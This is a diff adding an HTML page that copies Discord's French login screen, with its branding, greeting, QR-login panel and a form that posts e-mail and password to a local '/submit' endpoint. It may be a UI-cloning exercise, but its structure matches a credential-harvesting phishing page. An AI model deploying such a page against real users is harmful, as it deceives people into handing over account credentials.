@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="icon" href="img/discord-logo.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <img src="img/LogoWithText.png" alt="Logo Discord avec texte en top left" class="LogoWithText">
+    <div class="login-container">
+        <div class="login-content">
+            <div class="login-form">
+                <div class="login-header">
+                    <h1>Ha, te revoilà !</h1>
+                    <p>Nous sommes si heureux de te revoir !</p>
+                </div>
+                <form id="login-form" method="POST" action="/submit">
+                    <div class="error-message" id="error-message"></div>
+                    <div class="input-group">
+                        <label for="email">E-MAIL OU NUMÉRO DE TÉLÉPHONE</label>
+                        <a>*</a>
+                        <input type="text" id="email" name="email" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="password">MOT DE PASSE</label>
+                        <a>*</a>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+                    <div class="forgot-password">
+                        <a href="discord.html">Tu as oublié ton mot de passe ?</a>
+                    </div>
+                    <button type="submit" class="login-button">Connexion</button>
+                </form>
+            </div>
+            <div class="qr-container">
+                <div class="qr-code"></div>
+                <p><strong>Se connecter avec un</strong></p>
+                <p><strong>code QR</strong></p>
+                <p>Scanne-le avec l'<span>application mobile Discord</span></p>
+                <p>pour te connecter instantanément.</p>
+            </div>
+        </div>
+
+        <div class="signup-container">
+            <p class="signup">Besoin d'un compte ? <a href="discord.html">S'inscrire</a></p>
+        </div>
+    </div>
+</body>
+</html>
